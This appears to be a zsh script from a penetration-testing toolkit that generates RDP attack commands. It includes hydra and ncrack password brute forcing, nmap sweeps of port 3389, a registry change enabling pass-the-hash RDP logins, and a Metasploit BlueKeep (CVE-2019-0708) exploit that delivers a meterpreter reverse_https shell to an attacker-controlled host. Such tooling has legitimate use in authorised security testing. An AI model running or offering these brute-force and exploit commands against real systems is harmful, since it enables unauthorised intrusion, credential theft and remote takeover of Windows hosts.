#!/usr/bin/env zsh

#############################################################
# nb-enum-rdp
#############################################################
nb-enum-rdp-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-rdp
------------
The nb-enum-rdp namespace contains commands for scanning and enumerating RDP remote desktop services.

Commands
--------
nb-enum-rdp-install                  installs dependencies
nb-enum-rdp-hydra                    brute force with hydra
nb-enum-rdp-enable-pth               command to use to enable pth login via rdp
nb-enum-rdp-nmap-sweep               scan a network for services
nb-enum-rdp-tcpdump                  capture traffic to and from a host
nb-enum-rdp-ncrack                   brute force passwords for a user account
nb-enum-rdp-bluekeep                 bluekeep exploit reference
nb-enum-rdp-msf-bluekeep-scan        bluekeep metasploit scanner
nb-enum-rdp-msf-bluekeep-exploit     bluekeep metasploit exploit

DOC
}

nb-enum-rdp-install() {
    __info "Running $0..."
    __pkgs nmap tcpdump ncrack metasploit-framework
}

nb-enum-rdp-enable-pth() {
    __info 'To be able to RDP via PtH, we need to enable Restricted Admin Mode - use this command to enable Restricted Admin Mode:'
    __info 'After enabling this you can log in via pth - nb-ad-rce-rdp'
    __ok 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
}

nb-enum-rdp-hydra() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Is the service running on default port? (y/n)"
    local df && __askvar df "DEFAULT_PORT"

    if [[ $df == "n" ]]; then
      __ask "Enter port number"
      local pn && __askvar pn "PORT_NUMBER"
    fi

    if [[ $login == "p" ]]; then
      nb-vars-set-user
      if [[ $df == "n" ]]; then
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
      else
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
      fi
    elif [[ $login == "l" ]]; then
      nb-vars-set-wordlist
      nb-vars-set-pass
      if [[ $df == "n" ]]; then
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
      else
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
      fi
    elif [[ $login == "b" ]]; then
      __ask "Do you wanna manually specify wordlists? (y/n)"
      local sw && __askvar sw "SPECIFY_WORDLIST"
      if [[ $sw == "y" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/

        if [[ $df == "n" ]]; then
          print -z "hydra -L $ul -P $pl -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
        fi
      else
        nb-vars-set-wordlist
        if [[ $df == "n" ]]; then
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
        fi
      fi
    else
      echo
      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}

nb-enum-rdp-nmap-sweep() {
    __check-project

    __ask "Do you want to scan a network subnet or a host? (n/h)"
    local scan && __askvar scan "SCAN_TYPE"

    if [[ $scan == "h" ]]; then
      nb-vars-set-rhost
      print -z "grc nmap -n -Pn -sS -v -p3389 ${__RHOST} -oA $(__hostpath)/rdp-sweep"
    elif [[ $scan == "n" ]]; then
      nb-vars-set-network
      print -z "grc nmap -n -Pn -sS -v -p3389 ${__NETWORK} -oA $(__netpath)/rdp-sweep"
    else
      echo
      __err "Invalid option. Please choose 'n' for network or 'h' for host."
    fi
}

nb-enum-rdp-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3389 -w $(__hostpath)/rdp.pcap"
}

nb-enum-rdp-ncrack() {
    __check-project
    nb-vars-set-rhost
    __check-user
    print -z "ncrack -vv --user ${__USER} -P ${__PASSLIST} rdp://${__RHOST} -oN $(__hostpath)/ncrack-rdp.txt "
}

nb-enum-rdp-bluekeep() {
    __info "https://sploitus.com/exploit?id=EDB-ID:47683"
    print -z "searchsploit bluekeep"
}

nb-enum-rdp-msf-bluekeep-scan() {
    __check-project
    nb-vars-set-rhost
    local cmd="use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS ${__RHOST}; run; exit"
    print -z "msfconsole -n -q -x \" ${cmd} \" | tee $(__hostpath/bluekeep-scan.txt)"
}

nb-enum-rdp-msf-bluekeep-exploit() {
    nb-vars-set-rhost
    nb-vars-set-lhost
    nb-vars-set-lport

    __ask "Did you start a handler? (y/n)"
    local sh && __askvar sh "ANSWER"

    if [[ $sh == "n" ]]; then
      __err "Start a handler using on ${__LHOST}:${__LPORT} before proceeding."
      __info "Use nb-shell-handlers-msf-listener."
      exit 1
    fi

    __msf << VAR
use windows/rdp/cve_2019_0708_bluekeep_rce;
set RHOSTS ${__RHOST};
set PAYLOAD windows/x64/meterpreter/reverse_https;
set stagerverifysslcert true;
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set LHOST ${__LHOST};
set LPORT ${__LPORT};
run;
exit
VAR
}
